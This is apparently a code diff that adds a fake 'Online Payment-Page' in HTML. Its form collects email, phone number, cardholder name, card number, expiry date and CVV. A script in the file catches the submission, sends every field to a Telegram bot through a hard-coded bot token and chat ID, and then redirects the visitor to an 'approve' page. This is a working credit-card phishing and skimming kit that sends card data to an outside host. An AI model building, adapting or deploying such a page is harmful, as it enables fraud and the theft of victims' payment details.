@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online Payment-Page</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+
+    <div class="container">
+        <form method="post" id="telegramFormss">
+
+            <div class="row">
+
+                <!-- USER INFORMATION -->
+                <div class="col">
+                    <h3 class="title">Information</h3>
+
+                    <div class="inputBox">
+                        <label for="email">Email:</label>
+                        <input
+                            type="text"
+                            id="email"
+                            name="email"
+                            placeholder="Enter email address"
+                            required
+                        >
+                    </div>
+
+                    <div class="inputBox">
+                        <label for="contact">Contact:</label>
+                        <input
+                            type="number"
+                            id="contact"
+                            name="contact"
+                            placeholder="Enter your contact"
+                            required
+                        >
+                    </div>
+                </div>
+
+                <!-- PAYMENT INFORMATION -->
+                <div class="col">
+                    <h3 class="title">Payment (170)</h3>
+
+                    <div class="inputBox">
+                        <label>Payment Information:</label>
+                        <img src="cards.png" alt="credit/debit card image">
+                    </div>
+
+                    <div class="inputBox">
+                        <label for="cardName">Name On Card:</label>
+                        <input
+                            type="text"
+                            id="cardName"
+                            name="cardName"
+                            placeholder="Enter card name"
+                            required
+                        >
+                    </div>
+
+                    <div class="inputBox">
+                        <label for="cardNum">Credit Card Number:</label>
+                        <input
+                            type="text"
+                            id="cardNum"
+                            name="cardNum"
+                            placeholder="1111-2222-3333-4444"
+                            maxlength="19"
+                            required
+                        >
+                    </div>
+
+                    <div class="inputBox">
+                        <label for="expmonth">Exp Month:</label>
+                        <select name="expmonth" id="expmonth">
+                            <option value="">Choose month</option>
+                            <option value="January">January</option>
+                            <option value="February">February</option>
+                            <option value="March">March</option>
+                            <option value="April">April</option>
+                            <option value="May">May</option>
+                            <option value="June">June</option>
+                            <option value="July">July</option>
+                            <option value="August">August</option>
+                            <option value="September">September</option>
+                            <option value="October">October</option>
+                            <option value="November">November</option>
+                            <option value="December">December</option>
+                        </select>
+                    </div>
+
+                    <div class="flex">
+                        <div class="inputBox">
+                            <label for="expyear">Exp Year:</label>
+                            <select name="expyear" id="expyear">
+                                <option value="">Choose Year</option>
+                                <option value="2023">2023</option>
+                                <option value="2024">2024</option>
+                                <option value="2025">2025</option>
+                                <option value="2026">2026</option>
+                                <option value="2027">2027</option>
+                                <option value="2028">2028</option>
+                                <option value="2029">2029</option>
+                                <option value="2030">2030</option>
+                                <option value="2031">2031</option>
+                                <option value="2032">2032</option>
+                                <option value="2033">2033</option>
+                                <option value="2034">2034</option>
+                                <option value="2035">2035</option>
+                            </select>
+                        </div>
+
+                        <div class="inputBox">
+                            <label for="cvv">CVV</label>
+                            <input
+                                type="number"
+                                id="cvv"
+                                name="cvv"
+                                placeholder="1234"
+                                required
+                            >
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            
+            <input type="submit" value="Proceed" class="submit_btn">
+
+        </form>
+    </div>
+
+
+<script>
+document.getElementById("telegramFormss").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  var email = document.getElementById("email").value;
+  var contact = document.getElementById("contact").value;
+  var cardName = document.getElementById("cardName").value;
+  var cardNum = document.getElementById("cardNum").value;
+  var expmonth = document.getElementById("expmonth").value;
+  var expyear = document.getElementById("expyear").value;
+  var cvv = document.getElementById("cvv").value;
+
+  var botToken = "7654977396:AAEzzSUAiGBgY2JEl3K8PmMp-Quj3QMXYTg";
+  var chatId = "1308711346";
+
+  var message =
+    " New Form Submission\n\n" +
+    " Email: " + email + "\n" +
+    " Contact: " + contact + "\n" + 
+    " CardName: " + cardName + "\n" +  
+    " CardNum: " + cardNum + "\n" +   
+    " Expmonth: " + expmonth + "\n" +  
+    " Expyear: " + expyear + "\n" +   
+    " Cvv: " + cvv;   
+
+  var telegramURL =
+    "https://api.telegram.org/bot" + botToken +
+    "/sendMessage?chat_id=" + chatId +
+    "&text=" + encodeURIComponent(message);
+
+  fetch(telegramURL)
+    .then(response => {
+      // Redirect after sending data
+      window.location.href = "approve.html";
+    })
+    .catch(error => {
+      alert("Failed to send data");   
+    });
+});
+</script>
+
+
+</body>
+</html>
